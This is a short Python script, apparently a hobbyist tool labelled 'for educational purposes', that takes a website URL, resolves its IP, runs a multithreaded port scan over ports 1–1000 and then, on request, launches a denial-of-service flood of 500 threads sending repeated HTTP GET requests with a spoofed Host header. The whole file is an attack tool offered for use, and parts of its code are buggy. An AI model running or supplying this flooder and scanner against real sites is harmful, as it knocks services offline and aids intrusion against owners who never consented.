#Made this for educational purposes, Im not responsible for your actions 
#This is an expansion of Info Gathering Tool

#ibraries

import socket
import threading
from queue import Queue

#============================================

#Target Information

target = str(input("Put in a Website Url please: "))

port = int('80')

fake_ip = str('182.21.20.32')

target_ip = socket.gethostbyname(target)

print("Here is the Website's ip address:", target_ip)

#=============================================

#Port Scanner

print_lock = threading.Lock()

def portscan(port):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        con = s.connect((target, port))
        with print_lock:
            print('port', port, 'is open!!')

        con.close

    except:
        pass

def threader():
    while True:
        worker = q.get()
        portscan(worker)
        q.task_done()

q = Queue()

for x in range(500):
    t = threading.Thread(target=threader)
    t.dameon = True
    t.start()

for worker in range(1,1001):
    q.put(worker)

q.join()

#============================================

#DDos script

while True:
    ddos = int(input("Do you want to ddos, yes or no, 1 for yes, 0 for no: "))

    if ddos == 1:
        already_connected = 0
    
        def attack(): #DDos attack defined 
            while True:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.connect((target, port))
                s.sendto(("GET /" + target + "HTTP/1.1\r\n").encode('ascii'), (target, port))
                s.sendto(("Host: " + fake_ip + "\r\n\r\n").encode('ascii'), (target, port))
                s.close

                global already_connected
                already_connected += 1
                print(already_connected)

        for i in range(0, 500):
            thread = threading.Thread(target=attack)
            thread.start()

    elif ddos == 0:
        print("Okay, see ya!!!!")
        exit()

    else:
        print("You inputed wrong, try again!!!!")
